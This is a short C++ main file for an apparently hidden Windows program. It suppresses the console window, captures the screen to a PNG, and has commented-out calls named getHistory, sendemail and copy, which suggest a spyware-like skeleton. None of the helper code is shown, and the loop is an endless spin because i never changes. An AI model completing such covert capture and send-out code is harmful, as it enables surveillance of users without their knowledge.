#pragma comment( linker, "/subsystem:\"windows\" /entry:\"mainCRTStartup\"" )
#include "util.h"
#include<typeinfo>
#include<stdio.h>
#include<stdlib.h>
#include<string>
#pragma comment( linker, "/subsystem:\"windows\" /entry:\"mainCRTStartup\"" )

int main()
{
	ScreenCapture("asd.png");
	/*getHistory();
	sendemail();
	copy();*/
	int i = 0;
	while(1)
	{
		if(i==2)
		{
			break;
		}
	}
	return 0;
}